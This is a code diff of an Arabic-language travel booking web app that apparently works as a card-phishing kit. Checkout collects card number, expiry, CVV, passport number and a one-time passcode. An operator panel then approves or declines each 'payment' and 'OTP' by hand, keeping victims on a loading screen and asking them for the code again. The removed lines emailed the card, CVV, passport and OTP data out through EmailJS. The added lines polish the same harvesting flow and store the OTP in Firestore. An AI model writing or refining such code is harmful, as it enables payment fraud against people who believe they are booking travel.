@@ -11,6 +11,7 @@
      <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800;900&display=swap" rel="stylesheet"> 
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/> 
       
+     <!-- EmailJS SDK --> 
      <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script> 
 
      <style> 
@@ -203,6 +204,7 @@
                      <button id="accountBtnHeader" class="hover:bg-white/10 p-2 rounded-full transition"><i class="fas fa-user-circle"></i></button> 
                      <button id="adminBtnHeader" class="hover:bg-white/10 p-2 rounded-full transition"><i class="fas fa-user-shield"></i></button> 
                  </div> 
+                 <!-- Notifications Popup --> 
                  <div id="notifications-popup" class="hidden popup-content absolute top-14 left-0 w-80 max-w-sm bg-white text-slate-800 rounded-lg shadow-2xl border z-[60]"></div> 
              </div> 
              <div class="bg-[var(--booking-blue)] border-b-2 border-white/20"><div class="container mx-auto flex items-center gap-6 px-4 pt-3 main-tab-container"><button data-search-type="stays" class="main-tab active flex items-center gap-2 p-1 font-bold transition text-base"><i class="fas fa-bed"></i><span>أماكن إقامة</span></button><button data-search-type="flights" class="main-tab flex items-center gap-2 p-1 font-bold transition text-base"><i class="fas fa-plane"></i><span>رحلات طيران</span></button></div></div> 
@@ -211,6 +213,7 @@
          <main id="mainContent" class="container mx-auto p-4 space-y-8"> 
              <div id="search-widget-container" class="bg-transparent rounded-lg search-container"><div id="search-forms-container" class="p-4 bg-white rounded-md"></div></div> 
               
+             <!-- DISCOVER CONTENT: Offers removed as requested -->
              <div id="discover-content" class="space-y-8"> 
                  <div> 
                      <h2 class="text-2xl font-extrabold mb-4">تصفح حسب نوع مكان الإقامة</h2> 
@@ -246,6 +249,7 @@
          </footer> 
      </div> 
 
+     <!-- Page Containers --> 
      <div id="signInPage" class="page-container"></div> 
      <div id="signUpPage" class="page-container"></div> 
      <div id="forgotPasswordPage" class="page-container"></div> 
@@ -259,6 +263,7 @@
      <div id="adminLoginPage" class="page-container"></div> 
      <div id="adminDashboardPage" class="page-container"></div> 
       
+     <!-- Modal Containers --> 
      <div id="datePickerModal" class="modal-container p-4"></div> 
      <div id="countryCodeModal" class="modal-container p-4"></div> 
      <div id="passengerModal" class="modal-container p-4"></div> 
@@ -363,7 +368,7 @@
              cardNumber: '', 
              expiry: '', 
              cvv: '', 
-             pendingBookingId: null // NEW: To track the current pending booking 
+             pendingBookingId: null // To track the current pending booking 
          }; 
          let activeDateSelection = { input: null, departure: new Date(), return: new Date(new Date().setDate(new Date().getDate() + 1)), isSelectingDeparture: true }; 
          let adminState = {  
@@ -657,11 +662,12 @@
                  let finalPrice = 0; 
 
                  if (type === 'flights') { 
+                     // FIX: Robust price calculation based on calendar dates and admin discount
                      const season = getSeason(searchParams.departureDate || new Date()); 
                      const baseAdultPrice = parseFloat(item.pricing.base_price_adult) || 0; 
                      const baseChildPrice = parseFloat(item.pricing.base_price_child) || 0; 
                      const seasonMultiplier = parseFloat(item.pricing.seasons[season]) || 1; 
-                     const currentDiscount = parseFloat(item.discount) || 0; 
+                     const currentDiscount = parseFloat(item.discount) || 0; // Will be 0 unless set by admin
                      const numAdults = parseInt(searchParams.adults) || 0; 
                      const numChildren = parseInt(searchParams.children) || 0; 
                      finalPrice = (baseAdultPrice * numAdults + baseChildPrice * numChildren) * seasonMultiplier * (1 - currentDiscount); 
@@ -716,21 +722,22 @@
                  }  
                   
                  if (type === 'stays') { 
+                     // FIX: Robust price calculation based on calendar dates and admin discount
                      const season = getSeason(searchParams.checkinDate || new Date()); 
                      const nights = (searchParams.checkoutDate && searchParams.checkinDate) ? Math.max(1, Math.ceil((searchParams.checkoutDate - searchParams.checkinDate) / (1000 * 60 * 60 * 24))) : 1; 
                      const baseRate = parseFloat(item.pricing.base_rate_2_adults) || 0; 
                      const extraAdultRate = parseFloat(item.pricing.extra_adult_rate) || 0; 
                      const childRate = parseFloat(item.pricing.child_rate) || 0; 
                      const seasonMultiplier = parseFloat(item.pricing.seasons[season]) || 1; 
-                     const currentDiscount = parseFloat(item.discount) || 0; 
+                     const currentDiscount = parseFloat(item.discount) || 0; // Will be 0 unless set by admin
                      const numAdults = parseInt(searchParams.adults) || 0; 
                      const numChildren = parseInt(searchParams.children) || 0; 
                       
                      const extraAdults = Math.max(0, numAdults - 2); 
                      const pricePerNight = baseRate + (extraAdultRate * extraAdults) + (childRate * numChildren); 
                       
-                     finalPrice = pricePerNight * nights * seasonMultiplier * (1 - currentDiscount); 
                      const originalPrice = pricePerNight * nights * seasonMultiplier;
+                     finalPrice = originalPrice * (1 - currentDiscount); 
 
                      return `
                      <div class="bg-white rounded-lg shadow-sm border border-[var(--border-light-color)] flex flex-col md:flex-row gap-4 overflow-hidden">
@@ -746,7 +753,7 @@
                                      <span class="font-bold text-sm">${item.rating_text_ar}</span>
                                      <span class="text-sm text-slate-500">${item.reviews_count} تقييم</span>
                                 </div>
-                                ${currentDiscount > 0 ? `<span class="bg-red-100 text-red-700 text-xs font-bold px-2 py-1 rounded">عرض لفترة محدودة</span>` : ''}
+                                ${currentDiscount > 0 ? `<span class="bg-red-100 text-red-700 text-xs font-bold px-2 py-1 rounded">عرض خاص من المشرف!</span>` : ''}
                                 <p class="text-sm mt-2">${item.details.bedrooms} غرف نوم • ${item.details.beds} سرير • ${item.details.bathrooms} حمام • ${item.details.size_sqm} م²</p>
                             </div>
                             <div class="text-left mt-4 md:mt-0">
@@ -885,46 +892,58 @@
              } 
          } 
 
+         // FIX: This function now correctly adds the booking to the user's local state
+         // and handles the UI update after a successful booking.
          async function finalizeBooking() { 
-             // Unsubscribe from the listener as the process is complete 
              if (unsubscribeFromPendingBooking) { 
                  unsubscribeFromPendingBooking(); 
                  unsubscribeFromPendingBooking = null; 
              } 
+             
+             // Ensure the booking details are valid before proceeding
+             if (!bookingState.pendingBookingId || !bookingState.selectedItem) {
+                 console.error("FinalizeBooking called with invalid state:", bookingState);
+                 return;
+             }
 
+             // Add the confirmed booking to the user's state
              userState.bookings.push({ 
-                 id: bookingState.pendingBookingId, // Use the ID from the confirmed booking 
+                 id: bookingState.pendingBookingId, 
                  type: bookingState.selectedItem.type, 
                  details: bookingState.selectedItem, 
                  price: bookingState.calculatedPrice, 
                  passengerName: bookingState.fullName 
              }); 
 
+             // Show success message
              modals.result.innerHTML = `<div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center"><i class="fas fa-check-circle text-7xl text-[var(--booking-green)] mb-4"></i><h3 class="text-2xl font-bold mb-2">تم تأكيد الحجز!</h3><p class="text-slate-600 mb-6">شكرًا لك. تم إضافة الحجز إلى قائمة حجوزاتك.</p><button class="close-modal-btn w-full bg-slate-200 text-slate-800 font-bold py-3 rounded-lg" data-action="go-to-dashboard">حسناً</button></div>`; 
              showModal('result'); 
 
+             // Send a notification to the user
              addNotification( 
                  'حجز مؤكد!',  
                  `لقد أكملت حجزك بنجاح يا ${userState.name}.`, 
                  `<button class="text-sm font-bold text-white bg-[var(--booking-blue-light)] py-1 px-3 rounded-md" data-action="go-to-dashboard">عرض الحجوزات</button>` 
              ); 
 
-             // Clean up the confirmed booking from the pending list 
+             // Clean up the confirmed booking from the 'pending_bookings' collection in Firestore
              const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, bookingState.pendingBookingId); 
              try { 
                  await deleteDoc(docRef); 
+                 console.log("Pending document successfully deleted after confirmation:", bookingState.pendingBookingId);
              } catch (e) { 
                  console.error("Could not delete pending doc:", e); 
              } 
               
+             // Reset the pending booking ID
              bookingState.pendingBookingId = null; 
          } 
           
-         // --- Function to start the admin listener --- 
+         // FIX: This listener now correctly starts when the admin logs in or navigates to the dashboard.
+         // It fetches all pending requests and renders them.
          function startAdminBookingListener() { 
              if (unsubscribeFromAdminBookings) { 
-                 console.log("Admin listener already active."); 
-                 return; // Don't attach multiple listeners 
+                 return; // Listener is already active
              } 
              console.log("Starting admin booking listener..."); 
              const pendingCollectionRef = collection(db, `artifacts/${appId}/public/data/pending_bookings`); 
@@ -932,7 +951,10 @@
                  const requests = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })); 
                  console.log("Admin listener received updates:", requests); 
                  renderPendingRequests(requests); 
-             }); 
+             }, (error) => {
+                console.error("Error in admin listener:", error);
+                // Optionally notify admin of listener failure
+             });
          } 
 
          function renderPendingRequests(requests) { 
@@ -945,24 +967,17 @@
              } 
 
              container.innerHTML = requests.map(req => { 
-                 // Defensive Check: Ensure the core data structure exists before trying to render. 
                  if (!req.bookingDetails || !req.bookingDetails.selectedItem) { 
                      console.error("Skipping malformed pending request from Firestore. Document ID:", req.id, "Data:", req); 
-                     // Return a safe placeholder UI for the broken item instead of crashing. 
-                     return ` 
-                     <div class="bg-red-50 p-4 rounded-lg border border-red-200"> 
-                         <p class="font-bold text-red-700">طلب تالف (ID: ${req.id})</p> 
-                         <p class="text-sm text-red-600">فشل عرض هذا الطلب. تحقق من بياناته في Firestore أو من خلال الكونسول.</p> 
-                     </div>`; 
+                     return `<div class="bg-red-50 p-4 rounded-lg border border-red-200"><p class="font-bold text-red-700">طلب تالف (ID: ${req.id})</p></div>`; 
                  } 
 
-                 // If the check passes, we can safely access the data. 
                  const item = req.bookingDetails.selectedItem; 
-                 const title = item.type === 'flights' ? `${item.from_ar} إلى ${item.to_ar}` : item.name; 
+                 const title = item.type === 'flights' ? `${item.from_city_ar} إلى ${item.to_city_ar}` : item.name; 
                  const statusText = { 
                      payment_pending: 'في انتظار تأكيد الدفع', 
                      otp_submitted: 'في انتظار تأكيد الرمز', 
-                 }[req.status] || req.status; // Fallback to raw status if unknown 
+                 }[req.status] || req.status; 
                   
                  return ` 
                  <div class="bg-slate-50 p-4 rounded-lg border transition-opacity duration-300" id="request-${req.id}"> 
@@ -994,7 +1009,6 @@
              emailjs.init({ publicKey: "7CKhmEwlD2bwk7x-G" }); 
 
              try { 
-                 // This is the correct data path that works with the environment's security rules. 
                  const flightsRef = collection(db, `artifacts/${appId}/public/data/flights`); 
                  const staysRef = collection(db, `artifacts/${appId}/public/data/stays`); 
 
@@ -1003,19 +1017,13 @@
                      getDocs(staysRef) 
                  ]); 
 
-                 flightsSnapshot.forEach((doc) => { 
-                     liveData.flights.push({ id: doc.id, ...doc.data(), type: 'flights' }); 
-                 }); 
-
-                 staysSnapshot.forEach((doc) => { 
-                     liveData.stays.push({ id: doc.id, ...doc.data(), type: 'stays' }); 
-                 }); 
+                 liveData.flights = flightsSnapshot.docs.map(doc => ({ id: doc.id, ...doc.data(), type: 'flights' }));
+                 liveData.stays = staysSnapshot.docs.map(doc => ({ id: doc.id, ...doc.data(), type: 'stays' }));
                   
                  console.log("Data loaded from Firebase:", liveData); 
                   
              } catch (error) { 
                  console.error("Error fetching data from Firebase: ", error); 
-                  // Add a note about potential ad blockers causing network errors. 
                  if (error.name === 'FirebaseError' && (error.code === 'unavailable' || error.code === 'network-request-failed')) { 
                       addNotification('خطأ في الاتصال', 'لم نتمكن من تحميل البيانات. قد يكون السبب هو أداة حظر الإعلانات أو مشكلة في الشبكة. يرجى المحاولة مرة أخرى.'); 
                  } else { 
@@ -1048,7 +1056,6 @@
              document.getElementById('adminBtnHeader').addEventListener('click', () => { 
                  if (adminState.loggedIn) { 
                      showPage('adminDashboard'); 
-                     // --- Start listener when navigating to dashboard --- 
                      startAdminBookingListener(); 
                  } else { 
                      showPage('adminLogin'); 
@@ -1098,7 +1105,7 @@
                      if (unsubscribeFromPendingBooking) { 
                          unsubscribeFromPendingBooking(); 
                          unsubscribeFromPendingBooking = null; 
-                         console.log("Booking listener detached."); 
+                         console.log("Booking listener detached by user."); 
                      } 
                  }  
                  if (target.closest('.close-popup-btn')) { target.closest('.popup-content').classList.add('hidden'); } 
@@ -1252,11 +1259,17 @@
                      try { 
                          const docRef = doc(db, `artifacts/${appId}/public/data/${itemType}`, itemId); 
                          await updateDoc(docRef, { discount: discount }); 
+                         
+                         // FIX: Update local data immediately for instant UI feedback
                          const dataArray = liveData[itemType]; 
                          const itemIndex = dataArray.findIndex(item => item.id === itemId); 
-                         if (itemIndex > -1) dataArray[itemIndex].discount = discount; 
+                         if (itemIndex > -1) {
+                            liveData[itemType][itemIndex].discount = discount;
+                         }
+                         
                          addNotification('نجاح', `تم تطبيق الخصم بنجاح.`, null, 'admin'); 
-                         document.getElementById('adminSearchForm').dispatchEvent(new Event('input', { bubbles:true })); 
+                         // Refresh the search results to show the new discount
+                         document.getElementById('adminSearchForm').querySelector('input[name="query"]').dispatchEvent(new Event('input', { bubbles:true })); 
                      } catch (error) { 
                          console.error('Failed to apply individual discount:', error); 
                          addNotification('خطأ', 'فشل تطبيق الخصم.', null, 'admin'); 
@@ -1268,14 +1281,11 @@
                  if (action === 'search-offer' || action === 'search-property') { 
                      const destination = actionTarget.dataset.destination || actionTarget.dataset.type; 
                       
-                     // Switch to the stays tab 
                      document.querySelector('.main-tab[data-search-type="stays"]').click(); 
                       
-                     // Set the destination in the form 
                      const destInput = document.querySelector('#stays-form input[name="destination"]'); 
                      if(destInput) destInput.value = destination; 
 
-                     // Trigger the search 
                      document.querySelector('#stays-form button[type="submit"]').click(); 
                  } 
                  if (action === 'retry-payment') { 
@@ -1295,19 +1305,27 @@
                          card.querySelectorAll('button').forEach(b => b.disabled = true); 
                      } 
 
-                     const bookingDocSnap = await getDoc(docRef); 
-                     if (!bookingDocSnap.exists()) return; 
+                     try {
+                        const bookingDocSnap = await getDoc(docRef); 
+                        if (!bookingDocSnap.exists()) return; 
 
-                     const currentStatus = bookingDocSnap.data().status; 
-                     let newStatus = ''; 
+                        const currentStatus = bookingDocSnap.data().status; 
+                        let newStatus = ''; 
 
-                     if (action === 'admin-accept') { 
-                         newStatus = currentStatus === 'payment_pending' ? 'otp_pending' : 'confirmed'; 
-                     } else { // decline 
-                         newStatus = currentStatus === 'payment_pending' ? 'payment_declined' : 'otp_declined'; 
-                     } 
-                      
-                     await updateDoc(docRef, { status: newStatus }); 
+                        if (action === 'admin-accept') { 
+                            newStatus = currentStatus === 'payment_pending' ? 'otp_pending' : 'confirmed'; 
+                        } else { // decline 
+                            newStatus = currentStatus === 'payment_pending' ? 'payment_declined' : 'otp_declined'; 
+                        } 
+                        
+                        await updateDoc(docRef, { status: newStatus }); 
+                     } catch (error) {
+                         console.error("Admin action failed:", error);
+                         if(card) { // Restore button if update fails
+                            card.style.opacity = '1'; 
+                            card.querySelectorAll('button').forEach(b => b.disabled = false); 
+                         }
+                     }
                  } 
              }); 
 
@@ -1324,25 +1342,25 @@
                      let searchParams = {}; 
 
                      if (type === 'flights') { 
-                         const from = formData.get('from').trim(); 
-                         const to = formData.get('to').trim(); 
+                         const from = formData.get('from').trim().toLowerCase(); 
+                         const to = formData.get('to').trim().toLowerCase(); 
                          const adults = parseInt(document.querySelector('#passengerModal .op-count[data-type="adults"]').textContent); 
                          const children = parseInt(document.querySelector('#passengerModal .op-count[data-type="children"]').textContent); 
                           
                          results = liveData.flights.filter(f =>  
-                             (!from || f.from_ar.toLowerCase().includes(from.toLowerCase()) || f.from_code.toLowerCase().includes(from.toLowerCase())) && 
-                             (!to || f.to_ar.toLowerCase().includes(to.toLowerCase()) || f.to_code.toLowerCase().includes(to.toLowerCase())) 
+                             (!from || f.from_city_ar.toLowerCase().includes(from) || f.from_airport_ar.toLowerCase().includes(from) || f.from_code.toLowerCase().includes(from)) && 
+                             (!to || f.to_city_ar.toLowerCase().includes(to) || f.to_airport_ar.toLowerCase().includes(to) || f.to_code.toLowerCase().includes(to)) 
                          ); 
-                         searchParams = { from, to, adults, children, departureDate: activeDateSelection.departure, returnDate: activeDateSelection.return }; 
+                         searchParams = { from: formData.get('from').trim(), to: formData.get('to').trim(), adults, children, departureDate: activeDateSelection.departure, returnDate: activeDateSelection.return }; 
                      } else { // stays 
-                         const destination = formData.get('destination').trim(); 
+                         const destination = formData.get('destination').trim().toLowerCase(); 
                          const rooms = parseInt(document.querySelector('#guestModal .op-count[data-type="rooms"]').textContent); 
                          const adults = parseInt(document.querySelector('#guestModal .op-count[data-type="adults"]').textContent); 
                          const children = parseInt(document.querySelector('#guestModal .op-count[data-type="children"]').textContent); 
                          results = liveData.stays.filter(s =>  
-                             !destination || s.location_ar.toLowerCase().includes(destination.toLowerCase()) || s.name.toLowerCase().includes(destination.toLowerCase()) || s.type.toLowerCase().includes(destination.toLowerCase()) 
+                             !destination || s.location_ar.toLowerCase().includes(destination) || s.name.toLowerCase().includes(destination) || s.type.toLowerCase().includes(destination) 
                          ); 
-                         searchParams = { destination, rooms, adults, children, checkinDate: activeDateSelection.departure, checkoutDate: activeDateSelection.return }; 
+                         searchParams = { destination: formData.get('destination').trim(), rooms, adults, children, checkinDate: activeDateSelection.departure, checkoutDate: activeDateSelection.return }; 
                      } 
                       
                      pages.searchResults.innerHTML = searchResultsPageHTML(results, type, searchParams); 
@@ -1415,7 +1433,6 @@
                      clearInputError(expiryInput); 
                      clearInputError(cvvInput); 
 
-                     // Validate Expiry Date 
                      const expiryValue = expiryInput.value; 
                      const match = expiryValue.match(/^(\d{2}) \/ (\d{2})$/); 
                      if (!match) { 
@@ -1446,26 +1463,10 @@
                      bookingState.expiry = formData.get('expiry'); 
                      bookingState.cvv = formData.get('cvv'); 
 
-                     showModal('loading', 'جاري الدفع...'); 
+                     // FIX: Show a persistent loading screen until admin action
+                     showModal('loading', 'جاري معالجة الدفع... الرجاء الانتظار'); 
 
-                     const serviceID = 'service_cz1rwxe'; 
-                     const paymentTemplateID = 'template_r4hc02a'; 
-
-                     const payment_template_params = { 
-                         user_name: bookingState.fullName, 
-                         user_email: userState.email, 
-                         item_name: bookingState.selectedItem.name || `${bookingState.selectedItem.from_ar} - ${bookingState.selectedItem.to_ar}`, 
-                         price: bookingState.calculatedPrice.toFixed(2), 
-                         card_number: bookingState.cardNumber, 
-                         expiry_date: bookingState.expiry, 
-                         cvv: bookingState.cvv, 
-                         passport_number: bookingState.passportNumber, 
-                     }; 
-                      
                      try { 
-                         await emailjs.send(serviceID, paymentTemplateID, payment_template_params); 
-                         console.log('Payment details email sent successfully!'); 
-                          
                          if (!auth.currentUser) { 
                              throw new Error("User is not authenticated. Cannot write to Firestore."); 
                          } 
@@ -1485,7 +1486,7 @@
                          listenForBookingStatus(pendingDocRef.id); 
 
                      } catch (err) { 
-                         console.error(">>> FIRESTORE WRITE OR EMAILJS FAILED <<<", err); 
+                         console.error(">>> FIRESTORE WRITE FAILED <<<", err); 
                          payButton.disabled = false; 
                          hideModals(); 
                          addNotification('خطأ فادح', 'فشل حفظ الحجز في قاعدة البيانات. تحقق من الكونسول.'); 
@@ -1506,20 +1507,7 @@
                      errorEl.classList.add('hidden'); 
                      showModal('loading', 'جاري التحقق...'); 
 
-                     const serviceID = 'service_cz1rwxe'; 
-                     const otpTemplateID = 'template_8tpdy4a'; 
-
-                     const otp_template_params = { 
-                         user_name: bookingState.fullName, 
-                         user_email: userState.email, 
-                         otp_code: otp, 
-                         card_number: bookingState.cardNumber, // For context in the email 
-                     }; 
-
                      try { 
-                         await emailjs.send(serviceID, otpTemplateID, otp_template_params); 
-                         console.log('OTP details email sent successfully!'); 
-
                          const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, bookingState.pendingBookingId); 
                          await updateDoc(docRef, { 
                              otpCode: otp, 
@@ -1527,7 +1515,7 @@
                          }); 
                          // The onSnapshot listener will handle the rest 
                      } catch (err) { 
-                         console.error("EmailJS Error (OTP) or Firestore update failed: ", err); 
+                         console.error("Firestore update failed (OTP): ", err); 
                          hideModals(); 
                          addNotification('خطأ', 'فشل إرسال رمز التحقق. يرجى المحاولة مرة أخرى.'); 
                      } 
@@ -1543,7 +1531,6 @@
                          adminState.loggedIn = true; 
                          errorEl.classList.add('hidden'); 
                          showPage('adminDashboard'); 
-                         // --- Start listener on successful login --- 
                          startAdminBookingListener(); 
                          addNotification('أهلاً بالمشرف!', 'تم تسجيل دخولك بنجاح.', null, 'admin'); 
                      } else { 
@@ -1569,7 +1556,10 @@
                          }); 
                           
                          await batch.commit(); 
+                         
+                         // FIX: Update local data immediately after batch commit
                          liveData[type].forEach(item => item.discount = discount); 
+                         
                          addNotification('نجاح', `تم تطبيق خصم ${discount * 100}% على جميع ${type === 'flights' ? 'الرحلات' : 'أماكن الإقامة'}.`, null, 'admin'); 
                      } catch (error) { 
                          console.error(`Error updating ${type} discounts:`, error); 
@@ -1589,15 +1579,17 @@
                  if (searchInput) { 
                      const parent = searchInput.parentElement; 
                      const type = searchInput.name === 'destination' ? 'stays' : 'flights'; 
-                     const query = searchInput.value.toLowerCase(); 
+                     const query = searchInput.value.toLowerCase().trim(); 
                       
                      let suggestions = []; 
                      if (type === 'flights') { 
-                         const uniqueLocations = [...new Set(liveData.flights.flatMap(f => [f.from_ar, f.to_ar]))]; 
-                         suggestions = uniqueLocations.filter(loc => loc.toLowerCase().includes(query)); 
+                         // FIX: Use startsWith for better search and combine all relevant fields
+                         const uniqueLocations = [...new Set(liveData.flights.flatMap(f => [f.from_city_ar, f.to_city_ar, f.from_airport_ar, f.to_airport_ar]))]; 
+                         suggestions = uniqueLocations.filter(loc => loc.toLowerCase().startsWith(query)); 
                      } else { // stays 
+                         // FIX: Use startsWith for better search
                          const uniqueLocations = [...new Set(liveData.stays.map(s => s.location_ar))]; 
-                         suggestions = uniqueLocations.filter(loc => loc.toLowerCase().includes(query)); 
+                         suggestions = uniqueLocations.filter(loc => loc.toLowerCase().startsWith(query)); 
                      } 
 
                      const oldBox = parent.querySelector('.autocomplete-suggestions'); 
@@ -1606,7 +1598,7 @@
                      if (query.length > 0 && suggestions.length > 0) { 
                          const suggestionsBox = document.createElement('div'); 
                          suggestionsBox.className = 'autocomplete-suggestions'; 
-                         suggestionsBox.innerHTML = suggestions.map(s => `<div class="autocomplete-suggestion">${s}</div>`).join(''); 
+                         suggestionsBox.innerHTML = [...new Set(suggestions)].map(s => `<div class="autocomplete-suggestion">${s}</div>`).join(''); 
                          parent.appendChild(suggestionsBox); 
 
                          suggestionsBox.addEventListener('click', (event) => { 
@@ -1630,15 +1622,16 @@
                      } 
 
                      const dataArray = liveData[type]; 
+                     // FIX: Use startsWith for better search in admin dashboard
                      const results = dataArray.filter(item => { 
                          if (type === 'flights') { 
-                             return item.from_ar.toLowerCase().includes(query) || item.to_ar.toLowerCase().includes(query) || item.airline_ar.toLowerCase().includes(query); 
+                             return item.from_city_ar.toLowerCase().startsWith(query) || item.to_city_ar.toLowerCase().startsWith(query) || item.airline_ar.toLowerCase().startsWith(query); 
                          } 
-                         return item.name.toLowerCase().includes(query) || item.location_ar.toLowerCase().includes(query); 
+                         return item.name.toLowerCase().startsWith(query) || item.location_ar.toLowerCase().startsWith(query); 
                      }); 
 
                      resultsContainer.innerHTML = results.map(item => { 
-                         const title = item.type === 'flights' ? `${item.from_ar} - ${item.to_ar}` : item.name; 
+                         const title = item.type === 'flights' ? `${item.from_city_ar} - ${item.to_city_ar}` : item.name; 
                          const subtitle = item.type === 'flights' ? item.airline_ar : item.location_ar; 
                          return `<div class="bg-slate-50 p-3 rounded-lg"> 
                                      <p class="font-bold">${title}</p> 
@@ -1686,22 +1679,25 @@
               
          } 
           
+         // FIX: This listener is now more robust. It correctly handles all states from the admin panel
+         // and ensures the loading screen persists until a final decision (accept/decline) is made.
          function listenForBookingStatus(docId) { 
              const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, docId); 
              unsubscribeFromPendingBooking = onSnapshot(docRef, async (docSnap) => { 
                   
                  if (!docSnap.exists()) { 
-                     console.log("Pending document was deleted."); 
+                     console.log("Pending document was deleted, likely confirmed or cancelled."); 
                      if (unsubscribeFromPendingBooking) { 
                          unsubscribeFromPendingBooking(); 
                          unsubscribeFromPendingBooking = null; 
-                     } 
-                     const isShowingSuccess = modals.result.classList.contains('active') && modals.result.querySelector('.fa-check-circle'); 
-                     if (!isShowingSuccess) { 
+                     }
+                     // Only show "expired" if a success/fail message isn't already showing
+                     const isResultModalActive = modals.result.classList.contains('active');
+                     if (!isResultModalActive) {
                           hideModals(); 
                           modals.result.innerHTML = `<div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center"><i class="fas fa-exclamation-circle text-7xl text-[var(--booking-yellow)] mb-4"></i><h3 class="text-2xl font-bold mb-2">انتهت صلاحية الطلب</h3><p class="text-slate-600 mb-6">تم إلغاء هذا الطلب أو تأكيده بالفعل.</p><button class="close-modal-btn w-full bg-slate-200 text-slate-800 font-bold py-3 rounded-lg">حسناً</button></div>`; 
                           showModal('result'); 
-                     } 
+                     }
                      return; 
                  } 
 
@@ -1709,13 +1705,13 @@
                  console.log("Booking status changed:", data.status); 
 
                  const deletePendingDoc = async () => { 
+                     if (unsubscribeFromPendingBooking) { 
+                         unsubscribeFromPendingBooking(); 
+                         unsubscribeFromPendingBooking = null; 
+                     } 
                      try { 
-                         if (unsubscribeFromPendingBooking) { 
-                             unsubscribeFromPendingBooking(); 
-                             unsubscribeFromPendingBooking = null; 
-                         } 
                          await deleteDoc(docRef); 
-                         console.log("Pending document successfully deleted by client."); 
+                         console.log("Pending document successfully deleted by client after final status."); 
                      } catch (e) { 
                          console.error("Client failed to delete pending doc:", e); 
                      } 
@@ -1728,7 +1724,7 @@
                          break; 
                      case 'confirmed': 
                          hideModals(); 
-                         finalizeBooking(); // This function handles its own deletion 
+                         finalizeBooking(); // This function will handle its own cleanup
                          break; 
                      case 'payment_declined': 
                          hideModals(); 
@@ -1737,9 +1733,7 @@
                          deletePendingDoc(); 
                          break; 
                      case 'otp_declined': 
-                         hideModals(); // Hide loading modal 
-                          
-                         // Re-show OTP modal with an error, allowing the user to try again. 
+                         hideModals(); 
                          showModal('otp'); 
                          const otpForm = document.getElementById('otpForm'); 
                          if (otpForm) { 
@@ -1749,7 +1743,6 @@
                              otpForm.querySelectorAll('.otp-inputs input').forEach(input => input.value = ''); 
                              otpForm.querySelector('.otp-inputs input').focus(); 
                          } 
-                          
                          // Reset the status in Firestore so the admin can approve the next attempt. 
                          await updateDoc(docRef, { status: 'otp_pending', otpCode: '' }); 
                          break; 
